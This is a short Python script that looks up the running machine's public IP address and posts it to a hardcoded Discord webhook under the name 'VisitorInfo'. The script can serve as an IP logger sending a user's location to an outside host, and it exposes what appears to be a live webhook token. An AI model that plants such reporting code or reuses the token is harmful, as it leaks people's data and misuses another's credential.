#!/usr/bin/env python3
import subprocess
import requests
import json
import os

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1383837972839010395/FTgsOkSi-vMpBEI-1NXmBS9krZeYa4TnY1G1n8y5EjVTrB8hw9jFcXwFkcs16RVYx5mH"

def get_public_ip():
    url = "https://api.ipify.org?format=text"
    response = requests.get(url)
	
    public_ip = response.text
	
    return public_ip

def send_to_discord(title, description):
    headers = {'Content-Type': 'application/json'}
    payload = {
        'username': 'VisitorInfo',
        'avatar_url': 'https://avatars.githubusercontent.com/u/25276978?s=460&v=4',
        'embeds': [
            {
                'title': title,
                'description': description,
                'color': 0xff00ff
            }
        ]
    }

    response = requests.post(DISCORD_WEBHOOK_URL, headers=headers, json=payload)
    if response.status_code == 204:
        print("Visitor Information sent to Discord successfully!")
    else:
        print("Failed to send to Discord! Status Code:", response.status_code)

if __name__ == '__main__':
    public_ip = get_public_ip()
    send_to_discord("Public IP Address", "**Public IP:** `{}`".format(public_ip))
